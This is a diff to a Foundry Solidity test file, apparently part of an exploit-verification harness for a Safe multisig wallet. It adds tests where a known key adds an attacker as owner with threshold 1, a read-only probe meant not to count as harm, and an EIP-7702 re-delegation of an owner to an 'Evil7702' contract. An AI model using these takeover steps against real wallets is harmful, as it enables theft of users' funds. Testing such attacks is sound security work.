@@ -50,3 +50,48 @@ contract ModuleBypassTest is SafeBase {
         assertEq(address(safe).balance, 0);
     }
 }
+
+// Control harm with no ETH moved: the known key adds the attacker as an owner and sets
+// the threshold to 1. The Safe is now the attacker's. This proof moves no funds.
+contract OwnerTakeoverTest is SafeBase {
+    function setUp() public { _deploy(); }
+
+    function test_ownerAdded() public {
+        _exec(address(safe), 0, abi.encodeWithSignature("addOwnerWithThreshold(address,uint256)", attacker, 1));
+        assertTrue(safe.getThreshold() == 1);
+        bool found;
+        address[] memory owners = safe.getOwners();
+        for (uint256 i; i < owners.length; i++) if (owners[i] == attacker) found = true;
+        assertTrue(found);
+    }
+}
+
+// A probe: reads the Safe and changes nothing. It passes, and it must not count as harm.
+contract ProbeOnlyTest is SafeBase {
+    function setUp() public { _deploy(); }
+
+    function test_probe() public view {
+        assertEq(safe.getThreshold(), 1);
+        assertEq(safe.getOwners().length, 3);
+    }
+}
+
+// EIP-7702 control harm: owner 0 is an EOA with a public key, so anyone can sign a
+// delegation for it. The replay puts the delegation on the account and runs the delegate.
+// Foundry here has no 7702 cheatcode, so the test writes the 0xef0100 designator with etch.
+contract Evil7702 {
+    event Hit(address account);
+    function pwn() external { emit Hit(address(this)); }
+}
+
+contract ReDelegationTest is SafeBase {
+    function setUp() public { _deploy(); }
+
+    function test_ownerReDelegated() public {
+        address owner0 = vm.addr(ANVIL_KEY_0);
+        Evil7702 evil = new Evil7702();
+        vm.etch(owner0, abi.encodePacked(hex"ef0100", address(evil)));
+        Evil7702(owner0).pwn();
+        assertEq(owner0.code.length, 23);
+    }
+}
